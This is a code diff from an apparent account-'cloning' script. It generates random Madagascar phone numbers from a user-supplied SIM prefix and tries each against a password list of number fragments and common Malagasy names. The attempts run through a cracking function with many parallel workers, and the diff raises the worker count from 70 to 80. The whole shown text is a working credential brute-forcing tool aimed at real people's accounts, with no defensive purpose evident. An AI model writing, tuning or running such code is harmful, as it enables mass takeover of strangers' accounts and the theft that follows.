@@ -95,7 +95,7 @@ def MR_ITACHI():
 def BD_CLONING():
     user=[]
     clear()
-    print(' CODE SIM MALAGASY : [+26132] [+26134] [+26138] [+26133]')
+    print(' CODE SIM MALAGASY : [26132] [26134] [26138] [26133]')
     print(' 261=0 Madagascar : [032] [034] [038] [033]')
     code=input(' ENTER SIM CODE >> ')
     linex()
@@ -108,14 +108,14 @@ def BD_CLONING():
     for nmbr in range(limit):
         nmp=''.join(map(str, generate_random_sequence(7)))
         user.append(nmp)
-    with tred(max_workers=70) as Dipto:
+    with tred(max_workers=80) as Dipto:
         tl=str(len(user))
         print(' TOTAL ACCOUNT : '+tl)
         print(' YOUR SIM CODE : '+code)
         print(' CLONING EN COURS ... ')
         linex()
         for psx in user:
-            ids=code+psx
+            ids=code+psx 
             passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'nomena','Nomena','lafatra','lahatra','Lahatra','fahendrena','mahery','Mahery','Fahendrena','amboara','Amboara','miangaly','Miangaly','miangola','Miangola','fanasina','Fanasina','fiderana','Fiderana','fandresena','Fandresena','nantenaina','rakotomalala','Rakotomalala','tanjona','Tanjona','solofo','Solofo','Nantenaina','nilaina','Nilaina','nirina','Nirina','Narindra','Rakoto','malala','Malala','mirana','Mirana','faniry','Faniry','rakoto','safidy','Safidy','valisoa','Valisoa','fanomezana','Fanomezana','Sarindra','sarindra','nambinina','Nambinina','Sitraka','sitraka','mamitiana','Mamitiana','vololona','Vololona','fanomezantsoa','Fanomezantsoa','fanantenana','Fanantenana','narindra','Narindra','sarobidy','Sarobidy','andriatsitohaina','Andriatsitohaina','lalaina','Lafatra','diamondra','Diamondra','finaritra','Finaritra','tahiana','Tahiana','voahangy','Voahangy','Lalaina']
             Dipto.submit(method_crack,ids,passlist)
             
